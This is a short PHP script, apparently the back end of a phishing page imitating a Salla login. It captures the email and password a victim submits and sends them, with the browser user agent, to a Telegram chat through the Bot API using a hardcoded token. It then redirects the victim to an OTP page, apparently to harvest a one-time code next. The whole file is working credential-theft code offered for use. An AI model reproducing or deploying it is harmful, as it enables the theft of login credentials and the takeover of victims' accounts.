<?php

$botToken = "8125381566:AAGfyKuODnK_RufFKXOQ15tS9ar_lBFBot4";
$chatId = "-4625923889";

$email = $_POST['email'];
$password = $_POST['password'];
$remember = isset($_POST['remember']) ? 'نعم' : 'لا';

// تم حذف جلب الآي بي وعدم إرساله إلى تيليجرام

$userAgent = $_SERVER['HTTP_USER_AGENT'];

$message = "╭━─━≪ Info ❄️ ≫─━━╮\n\n";
$message .= "Iتسجيل دخول سلةI\n\n";
$message .= "email : $email\n";
$message .= "pass : $password\n\n";
$message .= "------------------------\n\n";
// تم حذف سطر عنوان الآي بي والعلم
$message .= "User Agent: $userAgent\n";
$message .= "╰━─━≪ Info ❄️ ≫─━━╯";

$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=Markdown&text=" . urlencode($message);
file_get_contents($url);

header("Location: /sa/otp");
exit();
?>
